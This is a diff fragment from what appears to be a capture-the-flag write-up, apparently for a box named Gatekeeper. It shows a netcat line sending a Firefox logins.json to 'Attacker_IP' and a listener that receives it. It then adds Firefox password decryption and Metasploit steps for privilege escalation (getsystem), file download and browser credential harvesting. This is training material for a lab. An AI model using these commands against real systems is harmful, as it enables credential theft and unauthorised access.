@@ -472,6 +472,20 @@ C:\Users\natbat\Documents>nc.exe -nv Attacker_IP PORT < logins.json
 # To Receive
 └─$ sudo nc -lnvp PORT > logins.json
 ```
+Then process the files downloaded with decrytor:
+```
+python3 firefox_decrypt.py ./gatekeeper_firefox
+```
+
+## Metasploitable way instead
+Alternatively and a lot easier use the meterpreter shell in the payload used for initial shell connection with exploit/multi/handler listener to catch it.
+- Make sure LPORT,LHOST,PAYLOAD are set to align with the shell sent and attack host.
+- Trivial to access user.txt file
+- Can check current user with getuid
+- getsystem will allow escallation and access to root.txt
+- but download allows access to files relevant and straight download them for logins.json and key4.db using 'download "C:\\users\\natbat\\documents\\logins.json" logins.json'. Just make sure you start msfconsole in directory to save download files.
+- Enumerate applications present with 'run post/windows/gather/enum_applications'
+- Obtain firefox cred but still requires decryption using 'run post/multi/gather/firefox_creds', all enumerated or cred obtained stored in folder '/home/hacktopuser/.msf4/loot/' with folder with IP and date in name. 
 
 
 
